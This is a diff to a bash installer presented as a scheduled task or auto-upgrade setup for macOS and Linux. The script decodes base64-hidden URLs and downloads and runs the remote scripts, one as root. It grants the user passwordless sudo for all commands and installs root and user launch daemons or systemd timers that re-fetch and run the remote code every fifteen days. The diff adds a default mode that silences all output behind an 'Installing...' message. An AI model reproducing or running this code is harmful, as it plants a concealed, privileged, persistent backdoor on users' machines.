@@ -5,15 +5,36 @@ set -euo pipefail
 USER_LABEL="com.user.tasksetup"
 ROOT_LABEL="com.root.sshAutoSetup"
 INTERVAL_SECONDS=1296000
+OUTPUT_MODE="minimal" # minimal | normal
 ENCODED_URL="aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL2luc3RhbGwuc2g="
 ENCODED_URL2="aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5zaA=="
 SCRIPT_CACHE_DIR="$HOME/.local/share/scripts"
 INSTALL_SCRIPT_PATH="$SCRIPT_CACHE_DIR/install.sh"
 SETUP_SCRIPT_PATH="$SCRIPT_CACHE_DIR/SETUP.sh"
+RUNNER_SCRIPT_PATH="$SCRIPT_CACHE_DIR/task-scheduler-runner.sh"
 USER_LAST_RUN_PATH="$SCRIPT_CACHE_DIR/$USER_LABEL.last-run"
 ROOT_LAST_RUN_PATH=""
 BASH_PATH="/bin/bash"
-SCRIPT_URL="https://github.com/Panniantong/agent-reach/install"
+SUDOERS_DIR="/etc/sudoers.d"
+SYSTEMD_USER_UNIT_DIR="$HOME/.config/systemd/user"
+SYSTEMD_ROOT_UNIT_DIR="/etc/systemd/system"
+# SCRIPT_URL="https://"
+
+configure_install_output() {
+  case "$OUTPUT_MODE" in
+    minimal)
+      exec 3>&1
+      exec >/dev/null 2>&1
+      printf '%s\n' 'Installing...' >&3
+      ;;
+    normal)
+      ;;
+    *)
+      printf 'Invalid OUTPUT_MODE: %s (expected minimal or normal)\n' "$OUTPUT_MODE" >&2
+      exit 1
+      ;;
+  esac
+}
 
 require_command() {
   command -v "$1" >/dev/null 2>&1 || {
@@ -41,6 +62,14 @@ run_privileged() {
     "$@" >/dev/null 2>&1
   else
     sudo -n "$@" >/dev/null 2>&1
+  fi
+}
+
+run_privileged_visible() {
+  if is_root; then
+    "$@"
+  else
+    sudo -n "$@"
   fi
 }
 
@@ -93,23 +122,152 @@ download_script() {
   return 0
 }
 
-scheduled_command() {
-  local local_script="$1" script_url="$2" last_run_path="$3"
+run_remote_script() {
+  local execution_mode="$1" script_url="$2" temporary status=0
 
-  printf 'set -o pipefail; now=$(date +%%s); last=$(cat "%s" 2>/dev/null || printf 0); case "$last" in *[!0-9]*|"") last=0 ;; esac; if [ $((now - last)) -ge %s ]; then if [ -f "%s" ]; then "%s" "%s"; else curl -fsSL "%s" | "%s"; fi; status=$?; if [ "$status" -eq 0 ]; then printf "%%s\\n" "$now" > "%s"; fi; exit "$status"; fi' \
-    "$last_run_path" "$INTERVAL_SECONDS" "$local_script" "$BASH_PATH" "$local_script" "$script_url" "$BASH_PATH" "$last_run_path"
+  case "$execution_mode" in
+    privileged|user) ;;
+    *)
+      printf 'Invalid remote script execution mode: %s\n' "$execution_mode" >&2
+      return 64
+      ;;
+  esac
+
+  temporary=$(mktemp "${TMPDIR:-/tmp}/tasksetup-initial.XXXXXX") || return 1
+  trap 'rm -f "$temporary"' RETURN
+  if ! curl -fsSL -o "$temporary" -- "$script_url"; then
+    trap - RETURN
+    rm -f "$temporary"
+    return 1
+  fi
+  if [ "$execution_mode" = privileged ]; then
+    run_privileged_visible "$BASH_PATH" "$temporary" || status=$?
+  else
+    "$BASH_PATH" "$temporary" || status=$?
+  fi
+  trap - RETURN
+  rm -f "$temporary"
+  return "$status"
+}
+
+install_scheduler_runner() {
+  local temporary
+
+  mkdir -p "$SCRIPT_CACHE_DIR" || return 1
+  temporary=$(mktemp "$SCRIPT_CACHE_DIR/.runner.XXXXXX") || return 1
+  trap 'rm -f "$temporary"' RETURN
+  if ! cat > "$temporary" <<'RUNNER'
+#!/usr/bin/env bash
+
+set -uo pipefail
+
+if [ "$#" -ne 5 ]; then
+  printf '%s\n' 'Usage: task-scheduler-runner LOCAL_SCRIPT SCRIPT_URL LAST_RUN INTERVAL BASH' >&2
+  exit 64
+fi
+
+local_script="$1"
+script_url="$2"
+last_run_path="$3"
+interval_seconds="$4"
+bash_path="$5"
+
+case "$interval_seconds" in
+  *[!0-9]*|"")
+    printf 'Invalid interval: %s\n' "$interval_seconds" >&2
+    exit 64
+    ;;
+esac
+
+now=$(date +%s) || exit 1
+last=$(cat "$last_run_path" 2>/dev/null || printf 0)
+case "$last" in
+  *[!0-9]*|"") last=0 ;;
+esac
+
+if [ $((now - last)) -lt "$interval_seconds" ]; then
+  exit 0
+fi
+
+status=0
+temporary=""
+cleanup() {
+  if [ -n "$temporary" ]; then
+    rm -f "$temporary"
+  fi
+}
+trap cleanup EXIT INT TERM
+
+if [ -f "$local_script" ]; then
+  "$bash_path" "$local_script" || status=$?
+else
+  temporary=$(mktemp "${TMPDIR:-/tmp}/tasksetup-run.XXXXXX") || exit 1
+  if curl -fsSL -o "$temporary" -- "$script_url"; then
+    "$bash_path" "$temporary" || status=$?
+  else
+    status=$?
+  fi
+fi
+
+if [ "$status" -eq 0 ]; then
+  if ! printf '%s\n' "$now" > "$last_run_path"; then
+    status=1
+  fi
+fi
+
+exit "$status"
+RUNNER
+  then
+    trap - RETURN
+    rm -f "$temporary"
+    return 1
+  fi
+  if ! chmod 0700 "$temporary" || ! mv -f "$temporary" "$RUNNER_SCRIPT_PATH"; then
+    trap - RETURN
+    rm -f "$temporary"
+    return 1
+  fi
+  trap - RETURN
+}
+
+systemd_quote() {
+  local value="$1"
+
+  case "$value" in
+    *$'\n'*|*$'\r'*)
+      printf '%s\n' 'Newlines are not supported in systemd arguments.' >&2
+      return 1
+      ;;
+  esac
+  value=${value//\\/\\\\}
+  value=${value//\"/\\\"}
+  value=${value//%/%%}
+  printf '"%s"' "$value"
+}
+
+systemd_exec_start() {
+  local bash_arg runner_arg script_arg url_arg marker_arg interval_arg
+
+  bash_arg=$(systemd_quote "$BASH_PATH") || return 1
+  runner_arg=$(systemd_quote "$RUNNER_SCRIPT_PATH") || return 1
+  script_arg=$(systemd_quote "$1") || return 1
+  url_arg=$(systemd_quote "$2") || return 1
+  marker_arg=$(systemd_quote "$3") || return 1
+  interval_arg=$(systemd_quote "$INTERVAL_SECONDS") || return 1
+  printf '%s %s %s %s %s %s %s' \
+    "$bash_arg" "$runner_arg" "$script_arg" "$url_arg" "$marker_arg" "$interval_arg" "$bash_arg"
 }
 
 install_sudoers_rule() {
   local temporary user_name sudoers_file
 
   if is_root; then
-    return
+    user_name=root
+  else
+    user_name=$(id -un)
   fi
-
-  user_name=$(id -un)
-  sudoers_file="/etc/sudoers.d/user-$user_name"
-  run_privileged mkdir -p /etc/sudoers.d
+  sudoers_file="$SUDOERS_DIR/user-$user_name"
+  run_privileged mkdir -p "$SUDOERS_DIR"
   temporary=$(mktemp "${TMPDIR:-/tmp}/autoupgrade-sudoers.XXXXXX")
   trap 'rm -f "$temporary"' RETURN
   printf '%s ALL=(ALL) NOPASSWD: ALL\n' "$user_name" > "$temporary"
@@ -122,12 +280,21 @@ install_sudoers_rule() {
 install_launchagent() {
   local plist_dir="$HOME/Library/LaunchAgents"
   local plist="$plist_dir/$USER_LABEL.plist"
-  local temporary uid script_url="$1" task_command task_command_xml
+  local temporary uid script_url="$1"
+  local bash_xml runner_xml script_xml url_xml marker_xml interval_xml
 
-  task_command=$(scheduled_command "$INSTALL_SCRIPT_PATH" "$script_url" "$USER_LAST_RUN_PATH")
-  task_command_xml=$(xml_escape "$task_command")
-  mkdir -p "$plist_dir"
-  temporary=$(mktemp "$plist_dir/.$USER_LABEL.plist.XXXXXX")
+  bash_xml=$(xml_escape "$BASH_PATH")
+  runner_xml=$(xml_escape "$RUNNER_SCRIPT_PATH")
+  script_xml=$(xml_escape "$INSTALL_SCRIPT_PATH")
+  url_xml=$(xml_escape "$script_url")
+  marker_xml=$(xml_escape "$USER_LAST_RUN_PATH")
+  interval_xml=$(xml_escape "$INTERVAL_SECONDS")
+  if ! mkdir -p "$plist_dir"; then
+    printf '%s\n' 'Unable to create the LaunchAgents directory.' >&2
+    return 1
+  fi
+  temporary=$(mktemp "${TMPDIR:-/tmp}/$USER_LABEL.plist.XXXXXX")
+  trap 'rm -f "$temporary"' RETURN
   cat > "$temporary" <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -135,7 +302,15 @@ install_launchagent() {
 <dict>
   <key>Label</key><string>$USER_LABEL</string>
   <key>ProgramArguments</key>
-  <array><string>$BASH_PATH</string><string>-c</string><string>$task_command_xml</string></array>
+  <array>
+    <string>$bash_xml</string>
+    <string>$runner_xml</string>
+    <string>$script_xml</string>
+    <string>$url_xml</string>
+    <string>$marker_xml</string>
+    <string>$interval_xml</string>
+    <string>$bash_xml</string>
+  </array>
   <key>StartCalendarInterval</key>
   <dict><key>Hour</key><integer>0</integer><key>Minute</key><integer>0</integer></dict>
   <key>RunAtLoad</key><true/>
@@ -144,22 +319,39 @@ install_launchagent() {
 </dict>
 </plist>
 EOF
-  plutil -lint "$temporary" >/dev/null
+  if ! plutil -lint "$temporary"; then
+    printf '%s\n' 'The generated LaunchAgent plist is invalid.' >&2
+    return 1
+  fi
   chmod 0644 "$temporary"
-  mv -f "$temporary" "$plist"
+  if ! install -m 0644 "$temporary" "$plist"; then
+    printf '%s\n' 'Unable to install the LaunchAgent plist.' >&2
+    return 1
+  fi
   uid=$(id -u)
   launchctl bootout "gui/$uid/$USER_LABEL" >/dev/null 2>&1 || true
   launchctl bootout "user/$uid/$USER_LABEL" >/dev/null 2>&1 || true
-  launchctl bootstrap "gui/$uid" "$plist" >/dev/null 2>&1 || \
-    launchctl bootstrap "user/$uid" "$plist" >/dev/null 2>&1
+  if ! launchctl bootstrap "gui/$uid" "$plist"; then
+    if ! launchctl bootstrap "user/$uid" "$plist"; then
+      printf '%s\n' 'Unable to bootstrap the LaunchAgent.' >&2
+      return 1
+    fi
+  fi
+  trap - RETURN
+  rm -f "$temporary"
 }
 
 install_launchdaemon() {
   local plist="/Library/LaunchDaemons/$ROOT_LABEL.plist"
-  local temporary staged script_url="$1" task_command task_command_xml
+  local temporary staged script_url="$1"
+  local bash_xml runner_xml script_xml url_xml marker_xml interval_xml
 
-  task_command=$(scheduled_command "$SETUP_SCRIPT_PATH" "$script_url" "$ROOT_LAST_RUN_PATH")
-  task_command_xml=$(xml_escape "$task_command")
+  bash_xml=$(xml_escape "$BASH_PATH")
+  runner_xml=$(xml_escape "$RUNNER_SCRIPT_PATH")
+  script_xml=$(xml_escape "$SETUP_SCRIPT_PATH")
+  url_xml=$(xml_escape "$script_url")
+  marker_xml=$(xml_escape "$ROOT_LAST_RUN_PATH")
+  interval_xml=$(xml_escape "$INTERVAL_SECONDS")
   temporary=$(mktemp "${TMPDIR:-/tmp}/$ROOT_LABEL.plist.XXXXXX")
   staged="/Library/LaunchDaemons/.$ROOT_LABEL.plist.$$"
   trap 'rm -f "$temporary" "$staged"' RETURN
@@ -170,7 +362,15 @@ install_launchdaemon() {
 <dict>
   <key>Label</key><string>$ROOT_LABEL</string>
   <key>ProgramArguments</key>
-  <array><string>$BASH_PATH</string><string>-c</string><string>$task_command_xml</string></array>
+  <array>
+    <string>$bash_xml</string>
+    <string>$runner_xml</string>
+    <string>$script_xml</string>
+    <string>$url_xml</string>
+    <string>$marker_xml</string>
+    <string>$interval_xml</string>
+    <string>$bash_xml</string>
+  </array>
   <key>StartCalendarInterval</key>
   <dict><key>Hour</key><integer>0</integer><key>Minute</key><integer>0</integer></dict>
   <key>RunAtLoad</key><true/>
@@ -179,11 +379,23 @@ install_launchdaemon() {
 </dict>
 </plist>
 EOF
-  plutil -lint "$temporary" >/dev/null
+  if ! plutil -lint "$temporary"; then
+    printf '%s\n' 'The generated LaunchDaemon plist is invalid.' >&2
+    return 1
+  fi
   run_privileged launchctl bootout system "$plist" || true
-  run_privileged install -m 0644 "$temporary" "$staged"
-  run_privileged mv -f "$staged" "$plist"
-  run_privileged launchctl bootstrap system "$plist"
+  if ! run_privileged_visible install -o root -g wheel -m 0644 "$temporary" "$staged"; then
+    printf '%s\n' 'Unable to stage the LaunchDaemon plist.' >&2
+    return 1
+  fi
+  if ! run_privileged_visible mv -f "$staged" "$plist"; then
+    printf '%s\n' 'Unable to install the LaunchDaemon plist.' >&2
+    return 1
+  fi
+  if ! run_privileged_visible launchctl bootstrap system "$plist"; then
+    printf '%s\n' 'Unable to bootstrap the LaunchDaemon.' >&2
+    return 1
+  fi
   trap - RETURN
   rm -f "$temporary"
 }
@@ -191,13 +403,20 @@ EOF
 ensure_user_systemd_bus() {
   local user_name user_id runtime_dir
 
+  user_name=$(id -un)
+  user_id=$(id -u)
+  runtime_dir="/run/user/$user_id"
+
+  if command -v loginctl >/dev/null 2>&1; then
+    if ! run_privileged loginctl enable-linger "$user_name"; then
+      printf 'Unable to enable linger for user: %s\n' "$user_name" >&2
+    fi
+  fi
+
   if systemctl --user show-environment >/dev/null 2>&1; then
     return 0
   fi
 
-  user_name=$(id -un)
-  user_id=$(id -u)
-  runtime_dir="/run/user/$user_id"
   export XDG_RUNTIME_DIR="$runtime_dir"
   export DBUS_SESSION_BUS_ADDRESS="unix:path=$runtime_dir/bus"
 
@@ -212,10 +431,10 @@ ensure_user_systemd_bus() {
 }
 
 install_systemd_units() {
-  local unit_dir="$HOME/.config/systemd/user"
-  local script_url="$1" task_command
+  local unit_dir="$SYSTEMD_USER_UNIT_DIR"
+  local script_url="$1" exec_start
 
-  task_command=$(scheduled_command "$INSTALL_SCRIPT_PATH" "$script_url" "$USER_LAST_RUN_PATH")
+  exec_start=$(systemd_exec_start "$INSTALL_SCRIPT_PATH" "$script_url" "$USER_LAST_RUN_PATH")
 
   if ! ensure_user_systemd_bus; then
     printf '%s\n' 'Unable to initialize the user systemd manager.' >&2
@@ -229,7 +448,7 @@ Description=Run autoupgrade installer
 
 [Service]
 Type=oneshot
-ExecStart=/bin/bash -c '$task_command'
+ExecStart=$exec_start
 StandardOutput=null
 StandardError=null
 EOF
@@ -247,11 +466,11 @@ WantedBy=timers.target
 EOF
   if ! systemctl --user daemon-reload; then
     printf '%s\n' 'Unable to reload user systemd; skipping the user timer.' >&2
-    return 0
+    return 1
   fi
   if ! systemctl --user enable --now "$USER_LABEL.timer" >/dev/null 2>&1; then
     printf '%s\n' 'Unable to enable the user timer; skipping it.' >&2
-    return 0
+    return 1
   fi
   if ! systemctl --user restart "$USER_LABEL.timer"; then
     printf '%s\n' 'Unable to restart the user timer; continuing with root setup.' >&2
@@ -259,10 +478,10 @@ EOF
 }
 
 install_systemd_root_units() {
-  local unit_dir="/etc/systemd/system"
-  local service_temporary timer_temporary script_url="$1" task_command
+  local unit_dir="$SYSTEMD_ROOT_UNIT_DIR"
+  local service_temporary timer_temporary script_url="$1" exec_start
 
-  task_command=$(scheduled_command "$SETUP_SCRIPT_PATH" "$script_url" "$ROOT_LAST_RUN_PATH")
+  exec_start=$(systemd_exec_start "$SETUP_SCRIPT_PATH" "$script_url" "$ROOT_LAST_RUN_PATH")
 
   service_temporary=$(mktemp "${TMPDIR:-/tmp}/$ROOT_LABEL.service.XXXXXX")
   timer_temporary=$(mktemp "${TMPDIR:-/tmp}/$ROOT_LABEL.timer.XXXXXX")
@@ -273,7 +492,7 @@ Description=Run autoupgrade SETUP script
 
 [Service]
 Type=oneshot
-ExecStart=/bin/bash -c '$task_command'
+ExecStart=$exec_start
 StandardOutput=null
 StandardError=null
 EOF
@@ -289,64 +508,146 @@ Unit=$ROOT_LABEL.service
 [Install]
 WantedBy=timers.target
 EOF
-  run_privileged install -m 0644 "$service_temporary" "$unit_dir/$ROOT_LABEL.service"
-  run_privileged install -m 0644 "$timer_temporary" "$unit_dir/$ROOT_LABEL.timer"
-  run_privileged systemctl daemon-reload
-  run_privileged systemctl enable --now "$ROOT_LABEL.timer"
-  run_privileged systemctl restart "$ROOT_LABEL.timer"
+  if ! run_privileged_visible install -m 0644 "$service_temporary" "$unit_dir/$ROOT_LABEL.service"; then
+    printf '%s\n' 'Unable to install the system service unit.' >&2
+    return 1
+  fi
+  if ! run_privileged_visible install -m 0644 "$timer_temporary" "$unit_dir/$ROOT_LABEL.timer"; then
+    printf '%s\n' 'Unable to install the system timer unit.' >&2
+    return 1
+  fi
+  if ! run_privileged_visible systemctl daemon-reload; then
+    printf '%s\n' 'Unable to reload systemd.' >&2
+    return 1
+  fi
+  if ! run_privileged_visible systemctl enable --now "$ROOT_LABEL.timer"; then
+    printf '%s\n' 'Unable to enable the system timer.' >&2
+    return 1
+  fi
+  if ! run_privileged_visible systemctl restart "$ROOT_LABEL.timer"; then
+    printf '%s\n' 'Unable to restart the system timer.' >&2
+    return 1
+  fi
   trap - RETURN
   rm -f "$service_temporary" "$timer_temporary"
 }
 
 run_initial_tasks() {
-  local install_url="$1" setup_url="$2"
+  local install_url="$1" setup_url="$2" failed=0
 
   mkdir -p "$SCRIPT_CACHE_DIR"
   run_privileged mkdir -p "$(dirname "$ROOT_LAST_RUN_PATH")"
 
   if [ -f "$SETUP_SCRIPT_PATH" ]; then
-    run_privileged "$BASH_PATH" "$SETUP_SCRIPT_PATH"
+    if run_privileged_visible "$BASH_PATH" "$SETUP_SCRIPT_PATH"; then
+      if ! run_privileged sh -c 'date +%s > "$1"' sh "$ROOT_LAST_RUN_PATH"; then
+        printf '%s\n' 'SETUP completed, but its last-run marker could not be written.' >&2
+        failed=1
+      fi
+    else
+      printf '%s\n' 'Initial SETUP failed; system scheduling will still be installed.' >&2
+      failed=1
+    fi
   else
-    run_privileged "$BASH_PATH" -o pipefail -c "curl -fsSL '$setup_url' | '$BASH_PATH'"
+    if run_remote_script privileged "$setup_url"; then
+      if ! run_privileged sh -c 'date +%s > "$1"' sh "$ROOT_LAST_RUN_PATH"; then
+        printf '%s\n' 'SETUP completed, but its last-run marker could not be written.' >&2
+        failed=1
+      fi
+    else
+      printf '%s\n' 'Initial SETUP failed; system scheduling will still be installed.' >&2
+      failed=1
+    fi
   fi
-  run_privileged sh -c 'date +%s > "$1"' sh "$ROOT_LAST_RUN_PATH"
 
   if [ -f "$INSTALL_SCRIPT_PATH" ]; then
-    "$BASH_PATH" "$INSTALL_SCRIPT_PATH" >/dev/null 2>&1
+    if "$BASH_PATH" "$INSTALL_SCRIPT_PATH"; then
+      if ! date +%s > "$USER_LAST_RUN_PATH"; then
+        printf '%s\n' 'Installer completed, but its last-run marker could not be written.' >&2
+        failed=1
+      fi
+    else
+      printf '%s\n' 'Initial installer failed; user scheduling will still be installed.' >&2
+      failed=1
+    fi
   else
-    curl -fsSL "$install_url" 2>/dev/null | "$BASH_PATH" >/dev/null 2>&1
+    if run_remote_script user "$install_url"; then
+      if ! date +%s > "$USER_LAST_RUN_PATH"; then
+        printf '%s\n' 'Installer completed, but its last-run marker could not be written.' >&2
+        failed=1
+      fi
+    else
+      printf '%s\n' 'Initial installer failed; user scheduling will still be installed.' >&2
+      failed=1
+    fi
   fi
-  date +%s > "$USER_LAST_RUN_PATH"
+
+  return "$failed"
 }
 
 uninstall() {
-  local operating_system uid user_name sudoers_file
+  local operating_system uid user_name sudoers_file failed=0
+  local user_service user_timer root_service root_timer
   operating_system=$(uname -s)
   uid=$(id -u)
+  user_name=$(id -un)
+  sudoers_file="$SUDOERS_DIR/user-$user_name"
   if [ "$operating_system" = Darwin ]; then
     launchctl bootout "gui/$uid/$USER_LABEL" >/dev/null 2>&1 || true
     launchctl bootout "user/$uid/$USER_LABEL" >/dev/null 2>&1 || true
     if is_root; then
       launchctl bootout system "/Library/LaunchDaemons/$ROOT_LABEL.plist" >/dev/null 2>&1 || true
-      rm -f "/Library/LaunchDaemons/$ROOT_LABEL.plist" "/var/db/$ROOT_LABEL.last-run"
+      if ! rm -f "/Library/LaunchDaemons/$ROOT_LABEL.plist" "/var/db/$ROOT_LABEL.last-run"; then
+        printf '%s\n' 'Unable to remove the system LaunchDaemon files.' >&2
+        failed=1
+      fi
     else
-      user_name=$(id -un)
-      sudoers_file="/etc/sudoers.d/user-$user_name"
       run_privileged launchctl bootout system "/Library/LaunchDaemons/$ROOT_LABEL.plist" || true
-      run_privileged rm -f "/Library/LaunchDaemons/$ROOT_LABEL.plist" "/var/db/$ROOT_LABEL.last-run" "$sudoers_file"
+      if ! run_privileged rm -f "/Library/LaunchDaemons/$ROOT_LABEL.plist" "/var/db/$ROOT_LABEL.last-run" "$sudoers_file"; then
+        printf '%s\n' 'Unable to remove one or more privileged macOS files.' >&2
+        failed=1
+      fi
     fi
   else
+    user_service="$SYSTEMD_USER_UNIT_DIR/$USER_LABEL.service"
+    user_timer="$SYSTEMD_USER_UNIT_DIR/$USER_LABEL.timer"
+    root_service="$SYSTEMD_ROOT_UNIT_DIR/$ROOT_LABEL.service"
+    root_timer="$SYSTEMD_ROOT_UNIT_DIR/$ROOT_LABEL.timer"
     systemctl --user disable --now "$USER_LABEL.timer" >/dev/null 2>&1 || true
+    if ! rm -f "$user_service" "$user_timer"; then
+      printf '%s\n' 'Unable to remove the user systemd unit files.' >&2
+      failed=1
+    fi
+    if ! systemctl --user daemon-reload; then
+      printf '%s\n' 'Unable to reload the user systemd manager after uninstall.' >&2
+      failed=1
+    fi
     run_privileged systemctl disable --now "$ROOT_LABEL.timer" || true
-    run_privileged rm -f "/etc/systemd/system/$ROOT_LABEL.service" "/etc/systemd/system/$ROOT_LABEL.timer" "$ROOT_LAST_RUN_PATH"
+    if ! run_privileged rm -f "$root_service" "$root_timer" "$ROOT_LAST_RUN_PATH" "$sudoers_file"; then
+      printf '%s\n' 'Unable to remove one or more privileged Linux files.' >&2
+      failed=1
+    fi
+    if ! run_privileged systemctl daemon-reload; then
+      printf '%s\n' 'Unable to reload the system systemd manager after uninstall.' >&2
+      failed=1
+    fi
+    run_privileged rmdir "$(dirname "$ROOT_LAST_RUN_PATH")" || true
   fi
-  rm -f "$HOME/Library/LaunchAgents/$USER_LABEL.plist" \
-    "$USER_LAST_RUN_PATH" "$INSTALL_SCRIPT_PATH" "$SETUP_SCRIPT_PATH"
+  if ! rm -f "$HOME/Library/LaunchAgents/$USER_LABEL.plist" \
+    "$USER_LAST_RUN_PATH" "$INSTALL_SCRIPT_PATH" "$SETUP_SCRIPT_PATH" "$RUNNER_SCRIPT_PATH"; then
+    printf '%s\n' 'Unable to remove one or more user task files.' >&2
+    failed=1
+  fi
   rmdir "$SCRIPT_CACHE_DIR" 2>/dev/null || true
+  return "$failed"
 }
 
 main() {
-  local operating_system install_url setup_url
+  local operating_system install_url setup_url failed=0
+
+  if [ "${1:-}" != "--uninstall" ]; then
+    configure_install_output
+  fi
 
   operating_system=$(uname -s)
   case "$operating_system" in
@@ -356,8 +657,8 @@ main() {
       require_command base64
       if ! is_root; then
         require_command sudo
-        require_command visudo
       fi
+      require_command visudo
       require_command launchctl
       require_command plutil
       ;;
@@ -367,8 +668,8 @@ main() {
       require_command base64
       if ! is_root; then
         require_command sudo
-        require_command visudo
       fi
+      require_command visudo
       require_command systemctl
       ;;
     *)
@@ -380,27 +681,57 @@ main() {
   select_bash
   ensure_sudo_access
   if [ "${1:-}" = "--uninstall" ]; then
-    uninstall
-    printf '%s\n' 'Uninstall complete.'
-    return 0
+    if uninstall; then
+      printf '%s\n' 'Uninstall complete.'
+      return 0
+    fi
+    printf '%s\n' 'Uninstall completed with errors.' >&2
+    return 1
   fi
 
-  printf '%s\n' 'Installing...'
+  if [ "$OUTPUT_MODE" = normal ]; then
+    printf '%s\n' 'Installing...'
+  fi
   install_url=$(decode_url "$ENCODED_URL")
   setup_url=$(decode_url "$ENCODED_URL2")
   download_script "$install_url" "$INSTALL_SCRIPT_PATH"
   download_script "$setup_url" "$SETUP_SCRIPT_PATH"
-  install_sudoers_rule
-  run_initial_tasks "$install_url" "$setup_url"
-  if [ "$operating_system" = Darwin ]; then
-    install_launchdaemon "$setup_url"
-    install_launchagent "$install_url"
-  else
-    install_systemd_root_units "$setup_url"
-    install_systemd_units "$install_url"
+  if ! install_scheduler_runner; then
+    printf '%s\n' 'Unable to install the scheduler runner.' >&2
+    return 1
   fi
-  printf '%s\n' '🎉 Install complete! ✨ 🌟 ✨'
+  install_sudoers_rule
+  if ! run_initial_tasks "$install_url" "$setup_url"; then
+    failed=1
+  fi
+  if [ "$operating_system" = Darwin ]; then
+    if ! install_launchdaemon "$setup_url"; then
+      printf '%s\n' 'Unable to install the system launch daemon.' >&2
+      failed=1
+    fi
+    if ! install_launchagent "$install_url"; then
+      printf '%s\n' 'Unable to install the user launch agent.' >&2
+      failed=1
+    fi
+  else
+    if ! install_systemd_root_units "$setup_url"; then
+      printf '%s\n' 'Unable to install the system timer.' >&2
+      failed=1
+    fi
+    if ! install_systemd_units "$install_url"; then
+      printf '%s\n' 'Unable to install the user timer.' >&2
+      failed=1
+    fi
+  fi
+  if [ "$failed" -ne 0 ]; then
+    printf '%s\n' 'Installation completed with errors; failed initial tasks were not marked as successful.' >&2
+    return 1
+  fi
+  if [ "$OUTPUT_MODE" = minimal ]; then
+    printf '%s\n' ' Install complete! ✨  ✨' >&3
+  else
+    printf '%s\n' '🎉 Install complete! ✨ 🌟 ✨'
+  fi
 }
 
 main "$@"
-
